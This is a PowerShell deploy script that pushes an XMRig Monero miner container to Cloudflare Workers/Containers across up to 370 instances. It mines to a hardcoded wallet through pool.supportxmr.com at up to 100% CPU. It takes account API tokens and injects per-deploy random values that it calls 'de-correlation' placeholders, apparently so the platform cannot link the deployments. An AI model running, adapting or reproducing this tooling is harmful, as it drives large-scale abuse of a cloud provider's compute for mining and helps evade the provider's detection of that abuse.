[CmdletBinding()]
param(
  [Parameter(Mandatory)][string]$AccountId,
  [string]$Email = "",
  [string]$ApiKey = "",
  [string]$ApiToken = "",
  [string]$Wallet = "",
  [Parameter(Mandatory)][string]$WorkerName,
  [ValidateSet("ENAM","WNAM","EEUR","WEUR","APAC","SAM","ME","OC","AFR")][string]$Region = "WEUR",
  [int]$Target = 370,
  [int]$MaxInstances = 370,
  [string]$Pool = "pool.supportxmr.com:443",
  [int]$FillBatch = 8,
  [int]$Threads = 4,
  [int]$MaxCpuUsage = 100,
  [string]$Image = "",
  [switch]$BuildImage,
  [string]$Root = ""
)
$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ScriptDir = Split-Path -Parent $PSCommandPath
if(-not $Root){ $Root = (Resolve-Path (Join-Path $ScriptDir "..")).Path }
if(-not $ApiToken -and (-not $ApiKey -or -not $Email)){
  throw "Set -ApiToken, or set both -Email and -ApiKey."
}

function New-Secret([int]$bytes = 32){
  $b = New-Object byte[] $bytes
  [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($b)
  [Convert]::ToBase64String($b)
}
function New-Hex([int]$bytes = 12){
  $b = New-Object byte[] $bytes
  [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($b)
  ($b | ForEach-Object { $_.ToString('x2') }) -join ''
}

$template = Join-Path $Root "wrangler.template.jsonc"
$wr	   = Join-Path $Root "wrangler.jsonc"
if(-not (Test-Path -LiteralPath $template)){ $template = $wr }
if(-not (Test-Path -LiteralPath $template)){ throw "missing wrangler.jsonc" }

if((Resolve-Path -LiteralPath $template).Path -ne (Resolve-Path -LiteralPath $wr).Path){
  Copy-Item -LiteralPath $template -Destination $wr -Force
}

if(-not $Wallet){
  $walletMatch = [regex]::Match([IO.File]::ReadAllText($wr), '"EDGE_WALLET"\s*:\s*"([^"]+)"')
  if($walletMatch.Success -and $walletMatch.Groups[1].Value -ne '__WALLET__'){
    $Wallet = $walletMatch.Groups[1].Value
  }
}
if(-not $Wallet){ $Wallet = "42NziJLpe2SZ1ToBqfCXBk1FnFTpNkrdWQfsURbYDqjQ3mDZNfLBsA5YAWv8SaHeCVFQt4uMuuigC5NFURY8sgdz2gt4i5Y" }
if(-not $Wallet){ throw "Set -Wallet or put EDGE_WALLET in wrangler.jsonc." }

$containerName = "rt-" + $WorkerName
$nonce  = New-Hex 12
$workerApiKey = New-Secret 32
$hmac   = New-Secret 32
$imageRef = if($Image){ $Image }else{ "./Dockerfile" }
if($BuildImage -and -not $Image){
  throw "Local XMRig image cannot use the old Docker-less crane builder. Omit -BuildImage to let wrangler build ./Dockerfile, or pass -Image registry.cloudflare.com/$AccountId/runtime:<tag> after building/pushing externally."
}

$txt = [IO.File]::ReadAllText($wr)
$txt = $txt.Replace('__WORKER_NAME__',   $WorkerName)
$txt = $txt.Replace('__CONTAINER_NAME__', $containerName)
$txt = $txt.Replace('__REGION__',		$Region)
$txt = $txt.Replace('__WALLET__',		$Wallet)
$txt = $txt.Replace('__WORKER_PREFIX__', $WorkerName)
$txt = $txt.Replace('__API_KEY__',	   $workerApiKey)
$txt = $txt.Replace('__HMAC_KEY__',	  $hmac)
$txt = $txt.Replace('__BUILD_NONCE__',   $nonce)
$txt = [regex]::Replace($txt, '("image":\s*)"[^"]*"', ('$1"' + ($imageRef -replace '\\','/') + '"'))

if(-not $imageRef.StartsWith("./")){
  $txt = [regex]::Replace($txt, '(?m)^\s*"image_vars":.*\r?\n', '')
}
$txt = [regex]::Replace($txt, '("max_instances":\s*)\d+', ('${1}' + $MaxInstances))
$txt = [regex]::Replace($txt, '("TARGET_INSTANCES":\s*)"[^"]*"', ('$1"' + $Target + '"'))
$txt = [regex]::Replace($txt, '("FILL_BATCH":\s*)"[^"]*"', ('$1"' + $FillBatch + '"'))
$txt = [regex]::Replace($txt, '("EDGE_UPSTREAM":\s*)"[^"]*"', ('$1"' + $Pool + '"'))
$txt = [regex]::Replace($txt, '("EDGE_THREADS":\s*)"[^"]*"', ('$1"' + $Threads + '"'))
$txt = [regex]::Replace($txt, '("EDGE_MAX_CPU_USAGE":\s*)"[^"]*"', ('$1"' + $MaxCpuUsage + '"'))
[IO.File]::WriteAllText($wr, $txt, (New-Object Text.UTF8Encoding($false)))
Write-Host "[deploy] $WorkerName  acct=$AccountId  region=$Region  target=$Target  max=$MaxInstances  image=$imageRef"

$env:CLOUDFLARE_ACCOUNT_ID = $AccountId
if($ApiToken){
  $env:CLOUDFLARE_API_TOKEN = $ApiToken
  Remove-Item Env:\CLOUDFLARE_API_KEY -ErrorAction SilentlyContinue
  Remove-Item Env:\CLOUDFLARE_EMAIL -ErrorAction SilentlyContinue
}else{
  $env:CLOUDFLARE_API_KEY = $ApiKey
  $env:CLOUDFLARE_EMAIL = $Email
  Remove-Item Env:\CLOUDFLARE_API_TOKEN -ErrorAction SilentlyContinue
}
$env:WORKER_NAME		   = $WorkerName
$env:WRANGLER_SEND_METRICS = "false"

Push-Location $Root
try{

  Write-Host "[deploy] provisioning bindings (setup.mjs)..."
  node scripts/setup.mjs
  if($LASTEXITCODE -ne 0){ throw "setup.mjs failed ($LASTEXITCODE)" }
  if([IO.File]::ReadAllText($wr) -match 'PLACEHOLDER_(KV|D1)_ID'){ throw "setup.mjs left placeholders unpatched; aborting deploy" }
  if([IO.File]::ReadAllText($wr) -match '__[A-Z_]+__'){ throw "unresolved de-correlation placeholder remains; aborting deploy" }

  Write-Host "[deploy] wrangler deploy (gradual rollout)..."
  npx wrangler deploy
  if($LASTEXITCODE -ne 0){ throw "wrangler deploy failed ($LASTEXITCODE)" }
}finally{ Pop-Location }

Write-Host "[deploy] DONE: $WorkerName on $AccountId. Verify with: GET /accounts/$AccountId/containers/applications (use health.instances.active)."
